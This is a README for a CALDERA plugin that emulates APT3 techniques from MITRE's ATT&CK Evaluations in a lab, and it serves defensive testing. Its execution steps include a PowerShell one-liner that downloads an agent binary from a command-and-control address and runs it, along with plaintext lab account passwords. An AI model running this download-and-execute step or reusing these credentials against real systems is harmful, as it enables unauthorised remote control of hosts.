# CALDERA plugin: Eval

## Overview

A plugin supplying CALDERA with the TTPs used within the ATT&CK Evaluations Round 1 (APT3).
For more information see https://attackevals.mitre.org/about-attack-evaluations.html

1. Plugin Installation
2. Lab Setup
3. Execution

## Installation
Clone the Eval plugin into the caldera/plugin directory
```commandline
git clone https://github.com/mitre-attack/evals_caldera.git
```
Add Eval plugin to CALDERA config `conf/local.yml`
```yaml
plugins:
  - evals_caldera
```

Fill out facts in `data/facts/` specific to your setup.

## Environment Setup
[Full Round 1 Environment](https://attackevals.mitre.org/methodology/round1/environment.html)

Minimum requirements:
- Initial host exists within a windows domain
- Remote shared drive is mounted

## Execution

Please read the [full documentation](https://github.com/mitre/caldera/wiki/Plugins-evals) for this plugin.

## The Shire Mordor Environment

### Setup
[Shire CloudFormation Deployment](https://blacksmith.readthedocs.io/en/latest/mordor_shire.html)

[Shire Mordor Environment](https://mordor.readthedocs.io/en/latest/mordor_shire.html)

### Execution

1. RDP to the public ip of IT001.shire.com
   * Login - Administrator:P1ls3n! 
   * Launch an admin CMD
   * Close out of the RDP sesion but do not logout the Administrator
2. RDP to the public ip of IT001.shire.com
   * Login - pgustavo:W1n1!2019
   * Launch an admin CMD and a non-admin PowerShell
   * Execute the PowerShell command: `$url="http://172.18.39.8:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output);C:\Users\Public\sandcat.exe -server http://172.18.39.8:8888 -group evals_caldera -v;`
   * The 54ndc47 agent should now be checked in with CALDERA (172.18.39.8)

3. Browse to the CALDERA GUI
   * Login - wardog:B3tt3r!
   * Start an operation using the [ATT&CK Eval APT3 - Full](https://github.com/d4weiss/evals_caldera/blob/master/data/adversaries/ef93dd1b-809b-4a0b-b686-fef549cabbe4.yml) adversary profile
